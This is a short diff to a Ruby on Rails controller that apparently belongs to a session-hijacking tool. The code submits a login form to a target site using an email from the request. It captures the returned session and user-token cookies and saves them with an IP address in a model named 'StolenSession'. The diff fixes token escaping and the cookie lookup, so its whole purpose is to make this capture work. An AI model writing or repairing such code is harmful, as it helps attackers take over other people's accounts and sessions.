@@ -30,7 +30,7 @@ class SessionsController < ApplicationController
       'Referer' => uri.to_s,
       'Content-Type' => 'application/x-www-form-urlencoded'
     }
-    data = 'authenticity_token='+token+'&session[email]='+params[:session][:email]
+    data = 'authenticity_token='+CGI.escape(token)+'&session[email]='+params[:session][:email]
     puts data
 
     resp, data = http.post('/sessions', data, headers)
@@ -40,7 +40,7 @@ class SessionsController < ApplicationController
     cookies = CGI::Cookie::parse(cookieString)
 
     @session_id = cookies["session_id"][0]
-    @user_token = cookies["session_id"][0]
+    @user_token = cookies["user_token"][0]
     s = StolenSession.new({:ip_address => ip_address, :session_id => @session_id })
     s.save
   end
